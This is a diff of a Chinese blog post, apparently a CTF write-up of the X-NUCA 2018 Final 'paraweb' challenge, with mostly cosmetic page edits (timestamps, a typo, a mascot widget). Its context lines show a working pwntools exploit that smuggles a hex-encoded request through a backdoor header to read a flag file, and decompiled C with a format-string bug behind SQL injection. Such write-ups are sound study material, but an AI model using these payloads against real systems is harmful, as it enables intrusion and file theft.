@@ -23,11 +23,11 @@
 <meta property="og:site_name" content="p4nda&#39;s blog">
 <meta property="og:description" content="此题是X-NUCA&apos;2018 Final的一道题目，是一道Web&amp;Pwn题目，第一次做出此类题目，记录题目两种解法。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-12-06T16:08:36.368Z">
+<meta property="og:updated_time" content="2018-12-07T03:23:10.824Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="X-NUCA&#39;2018 Final paraweb解题思路">
 <meta name="twitter:description" content="此题是X-NUCA&apos;2018 Final的一道题目，是一道Web&amp;Pwn题目，第一次做出此类题目，记录题目两种解法。">
-
+<link rel="stylesheet" href="/live2d/css/live2d.css" />
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
 
@@ -368,7 +368,7 @@
 <h3 id="EXP1-py"><a href="#EXP1-py" class="headerlink" title="EXP1.py"></a>EXP1.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"172.17.0.1"</span>,<span class="number">8080</span>)</span><br><span class="line">buf= <span class="string">'''GET /login.html?username=admin&amp;password=admin111111111111111111111111111111111111111111111111111111nimda&amp;menu=request&amp;para=6c6f67696e2e68746d6c3f757365726e616d653d61646d696e2670617373776f72643d61646d696e3131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131316e696d6461266d656e753d706172736566696c6526706172613d2f6f70742f786e7563612f666c61672e74787420485454502f312e310d0a43726564656e7469616c733a204c47204752414d0d0a613a20 HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:8080</span></span><br><span class="line"><span class="string">Proxy-Connection: keep-alive</span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate, br</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Credentials: LG GRAM'''</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">p.send(buf)</span><br><span class="line">p.recvuntil(<span class="string">'Try login in me.!\\r\\n\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Try login in me.!\\r\\n\n'</span>)</span><br><span class="line">flag = p.recvline()[:<span class="number">-1</span>].replace(<span class="string">'\0'</span>,<span class="string">''</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] flag:'</span>,flag</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#'login.html?username=admin&amp;password=admin111111111111111111111111111111111111111111111111111111nimda&amp;menu=parsefile&amp;para=/opt/xnuca/flag.txt HTTP/1.1\r\nCredentials: LG GRAM\r\na: '</span></span><br></pre></td></tr></table></figure>
 <h2 id="利用点2"><a href="#利用点2" class="headerlink" title="利用点2"></a>利用点2</h2><p>说完了第一个利用，这就是一个后门操作，再看post包的处理吧</p>
 <p>在post包中提供了两个操作，可访问cart.html和product.html</p>
-<p>而这两个操作都构造了sql语句访问了mysql，并且都存在<strong>SQL 注入</strong>，想起被sqlmap支配的空间，和在国家某漏洞库实习的日子。</p>
+<p>而这两个操作都构造了sql语句访问了mysql，并且都存在<strong>SQL 注入</strong>，想起被sqlmap支配的恐惧，和在国家某漏洞库实习的日子。</p>
 <p>先看二进制漏洞，首先在cart.html中存在一个格式化字符串漏洞：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(haystack + <span class="number">1</span>, <span class="string">"cart.html"</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  strtok(qword_60F450, <span class="string">"="</span>);</span><br><span class="line">  strtok(<span class="number">0L</span>L, <span class="string">"&amp;"</span>);</span><br><span class="line">  s1 = strtok(<span class="number">0L</span>L, <span class="string">"="</span>);</span><br><span class="line">  v16 = strtok(<span class="number">0L</span>L, <span class="string">"&amp;"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( s1 &amp;&amp; v16 &amp;&amp; !<span class="built_in">strcmp</span>(s1, <span class="string">"cargo"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 = sub_402A21();</span><br><span class="line">    s = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x66</span>uLL);</span><br><span class="line">    <span class="built_in">snprintf</span>(s, <span class="number">0x64</span>uLL, <span class="string">"SELECT md5(%s) from cargo;"</span>, v16);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)mysql_query(v17, s) )</span><br><span class="line">      sub_402AD7(v17);</span><br><span class="line">    v19 = mysql_store_result(v17);</span><br><span class="line">    <span class="keyword">if</span> ( !v19 )</span><br><span class="line">      sub_402AD7(v17);</span><br><span class="line">    mysql_fetch_row(v19);</span><br><span class="line">    v20 = (<span class="keyword">const</span> <span class="keyword">char</span> **)mysql_fetch_row(v19);</span><br><span class="line">    <span class="keyword">if</span> ( *v20 )</span><br><span class="line"> -&gt;   <span class="built_in">printf</span>(*v20);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%s"</span>, <span class="string">"(Nil)"</span>);</span><br><span class="line">    <span class="built_in">free</span>(s);</span><br><span class="line">    mysql_free_result(v19);</span><br><span class="line">    mysql_close(v17);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
 <p>而从mysql中出来的数据如何存在格式化数据呢，队里Manasseh Zhou师傅给了我一个payload：</p>
@@ -400,7 +400,7 @@
         <p><span>本文标题:</span><a href="/2018/12/06/xnuca-final-paraweb/">X-NUCA&#39;2018 Final paraweb解题思路</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">P4nda</a></p>
         <p><span>发布时间:</span>2018-12-06, 23:12:43</p>
-        <p><span>最后更新:</span>2018-12-07, 00:08:36</p>
+        <p><span>最后更新:</span>2018-12-07, 11:23:10</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2018/12/06/xnuca-final-paraweb/" title="X-NUCA&#39;2018 Final paraweb解题思路">http://p4nda.top/2018/12/06/xnuca-final-paraweb/</a>
             <span class="copy-path" data-clipboard-text="原文: http://p4nda.top/2018/12/06/xnuca-final-paraweb/　　作者: P4nda" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
@@ -540,6 +540,22 @@
                 <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
             </div>
         </div>
+		<!-- 血小板 -->
+  <div id="landlord">
+      <div class="message" style="opacity:0"></div>
+      <canvas id="live2d" width="280" height="250" class="live2d"></canvas>
+      <div class="hide-button">隐藏</div>
+  </div>
+<script type="text/javascript" src="https://cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript">
+    var message_Path = '/live2d/'
+    var home_Path = 'https://haremu.com/'
+</script>
+<script type="text/javascript" src="/live2d/js/live2d.js"></script>
+<script type="text/javascript" src="/live2d/js/message.js"></script>
+<script type="text/javascript">
+    loadlive2d("live2d", "/live2d/model/xiaoban/model.json");
+</script>  
         
             <div class="visit">
                 
@@ -558,8 +574,9 @@
                     </span>
                 
             </div>
-        
+        		
     </div>
+	
 </footer>
     </div>
     
@@ -618,5 +635,5 @@
 <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
 </script>
   </div>
-<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"scale":0.5,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/koharu.model.json"},"mobile":{"show":false,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"pluginJsPath":"lib/","pluginRootPath":"live2dw/"});</script></body>
+</body>
 </html>
